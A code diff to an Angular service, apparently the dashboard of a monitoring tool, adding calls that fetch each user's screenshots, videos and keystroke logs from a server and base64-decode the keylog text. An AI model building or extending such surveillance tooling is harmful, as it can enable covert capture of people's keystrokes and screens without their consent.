@@ -1,14 +1,20 @@
+
 import { HttpClient } from "@angular/common/http";
 import { Injectable, OnInit } from "@angular/core";
 import { BehaviorSubject, Observable } from "rxjs";
+import { HexBase64BinaryEncoding } from 'crypto';
 
+export class Keylog
+{
+  out: string
+}
 export class Screenshot {
   link: string;
   name: string;
   size: number;
   timestamp: string;
 }
-export class Screenshots {
+export class Media {
   files: Screenshot[];
 }
 export class User {
@@ -53,7 +59,27 @@ export class ServerService {
     this.msg.next(uuid);
   }
 
-  getScreenShotsForUser(uuid: string) : Observable<Screenshots> {
-    return this.http.get<Screenshots>(this.HOST + "/user/screenshots?uuid=" + uuid);
+  getScreenShotsForUser(uuid: string): Observable<Media> {
+    return this.http.get<Media>(
+      this.HOST + "/user/screenshots?uuid=" + uuid
+    );
   }
+  getVideosForUser(uuid: string): Observable<Media> {
+    return this.http.get<Media>(this.HOST + "/user/videos?uuid=" + uuid);
+  }
+  getKeylogForUser(uuid: string): Observable<Keylog> {
+    return this.http.get<Keylog>(this.HOST + "/user/keylog?uuid=" + uuid);
+  }
+  decodefrom64  = () => (source: Observable<Keylog>) =>
+  new Observable(observer => {
+    return source.subscribe({
+      next(x) {
+        observer.next(
+          atob(x.out)
+        );
+      },
+      error(err) { observer.error(err); },
+      complete() { observer.complete(); }
+    });
+  });
 }
